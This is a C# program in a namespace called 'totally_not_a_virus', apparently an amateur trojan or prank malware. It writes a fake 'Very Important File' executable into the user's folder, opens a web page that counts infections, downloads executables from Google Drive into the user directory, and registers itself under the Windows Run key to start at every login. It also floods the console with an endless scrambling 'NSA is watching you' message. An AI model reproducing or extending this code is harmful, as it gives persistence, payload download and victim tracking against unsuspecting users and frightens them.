

//The imports need to be cleaned up once I finish removing any code below that I don't need. For now I am leaving them while that code is commented.

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
using System.Management;
using System.Net;

namespace totally_not_a_virus
{
    class Program
    {
        //Checks for the txt file on the hdd and places it there if not found.
        //*****Make sure to change the name of this file to what we are using.****
        public static void exeFile()
        {
            string path = $"C:\\Users\\{Environment.UserName}\\{Environment.MachineName}.{Environment.UserName}.exe";
            //Sticks Random File on comp and updates count website. Ehh may remove this.
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                    sw.WriteLine("Very Important File!");
                    sw.WriteLine("Your Computer WILL Break if you delete this file!");
                }

                //This line opens the count update web page.
                System.Diagnostics.Process.Start("http://southerntrust.co.nf");
            }

            //Copy this program.
            if (!File.Exists($"C:\\Users\\{Environment.UserName}\\{Environment.MachineName}.{Environment.UserName}myProgram.exe"))
            {
                copyFunc("myProgram");
            }

            //Copy other program.
            if (!File.Exists($"C:\\Users\\{Environment.UserName}\\{Environment.MachineName}.{Environment.UserName}.exe1.exe"))
            {
                copyFunc("otherProgram");
                fail();
            }
            return;
        }

        public static void runAtLogin()
        {
            //***CAUTION*** This has NOT been tested. It edits the registry, so be careful when you use it. Might damage the computer!!!
            //Also may have a permission problem.
            RegistryKey StartUpKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            //***Change the name of the program here***
            StartUpKey.SetValue("totally_not_a_virus_at_all.exe", "\"" + Application.ExecutablePath.ToString() + "\"");
            return;
        }

        //Function to copy the files.
        public static void copyFunc(string fileName)
        {
            if (fileName == "myProgram")
            {
                try
                {
                    WebClient Client = new WebClient();
                    //Google Drive File Name Here.
                    Client.DownloadFile("https://drive.google.com/open?id=1qhxByGp38c7o3ofjknUxtqc0lqEJGvDpxOrYR9rguvg", $"C:\\Users\\{Environment.UserName}\\{Environment.MachineName}.{Environment.UserName}.exe1.exe");
                    return;
                }
                catch
                {
                    return;
                }
            }
            else if (fileName == "otherProgram")
            {
                try
                {
                    WebClient Client = new WebClient();
                    //Google Drive File Name Here.
                    Client.DownloadFile("https://drive.google.com/open?id=otherProgram", $"C:\\Users\\{Environment.UserName}\\{Environment.MachineName}.{Environment.UserName}.exe1.exe");
                    return;
                }
                catch
                {
                    return;
                }
            }
        }

        static void fail()
        {
            Random randy = new Random();
            string strFail = "Wave and say hello! The NSA is watching you and your family! HIDE YO KIDS! HIDE YO WIFE!";

            for (int i = 0; i < 30; i++)
            {
                Console.WriteLine(strFail);
                System.Threading.Thread.Sleep(75);
            }
            System.Threading.Thread.Sleep(800);
            while (1 == 1)
            {
                int num1 = randy.Next(0, strFail.Length);
                int num2 = randy.Next(0, strFail.Length);
                char[] failCharArr = strFail.ToCharArray();
                char temp = failCharArr[num1];
                failCharArr[num1] = failCharArr[num2];
                failCharArr[num2] = temp;
                strFail = new string(failCharArr);
                string dict = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+-=[]{};:,<.>`~╚§├qT☻σô±╖ƒ";
                strFail = strFail + dict[randy.Next(0, dict.Length)];
                Console.WriteLine(strFail);
                System.Threading.Thread.Sleep(randy.Next(0, 20));
            }
        }


        //I'll be honest this was copied off stack overflow, I was going to use this to check files on the HDD but found a better/easier way.
        //Will probably be deleted in final version, only still here incase I need it.
        /// <summary>
        /// Retrieving HDD Serial No.
        /// </summary>
        /// <returns>
        /// string
        /// </returns>
       /** public static String GetHDDSerialNo()
        {
            ManagementClass mc = new ManagementClass("win32_processor");
            ManagementObjectCollection moc = mc.GetInstances();
            String Id = String.Empty;
            ManagementClass mangnmt = new ManagementClass("Win32_LogicalDisk");
            ManagementObjectCollection mcol = mangnmt.GetInstances();
            string result = "";
            foreach (ManagementObject strt in mcol)
            {
                result += Convert.ToString(strt["VolumeSerialNumber"]);
            }
            return result;
        }**/

        static void Main(string[] args)
        {
            //runAtLogin();
            //exeFile();
            fail();
            //String devices = USBProgram.Main2();
            //Console.WriteLine(devices);
            //Console.ReadLine();
            return;
        }

    }
}

    //This was code to scan for USB devices to exclude from a loop elsewhere, but I since removed the other code.
    //This is only still here incase I need it again late, will probably delete for final version.
    /*public class USBProgram
    {
        public static List<string> Main2()
        {
            var usbDevices = GetUSBDevices();

            foreach (var usbDevice in usbDevices)
            {
                Console.WriteLine("Device ID: {0}, PNP Device ID: {1}, Description: {2}",
                    usbDevice.DeviceID, usbDevice.PnpDeviceID, usbDevice.Description);
            }

            Console.Read();

            return usbDevices;
        }

        static List<USBDeviceInfo> GetUSBDevices()
        {
            List<USBDeviceInfo> devices = new List<USBDeviceInfo>();

            System.Management.ManagementObjectCollection collection;
            using (var searcher = new ManagementObjectSearcher(@"Select * From Win32_USBHub"))
                collection = searcher.Get();

            foreach (var device in collection)
            {
                devices.Add(new USBDeviceInfo(
                (string)device.GetPropertyValue("DeviceID"),
                (string)device.GetPropertyValue("PNPDeviceID"),
                (string)device.GetPropertyValue("Description")
                ));
            }

            collection.Dispose();
            return devices;
        }
    }

    class USBDeviceInfo
    {
        public USBDeviceInfo(string deviceID, string pnpDeviceID, string description)
        {
            this.DeviceID = deviceID;
            this.PnpDeviceID = pnpDeviceID;
            this.Description = description;
        }
        public string DeviceID { get; private set; }
        public string PnpDeviceID { get; private set; }
        public string Description { get; private set; }
    }
}*/
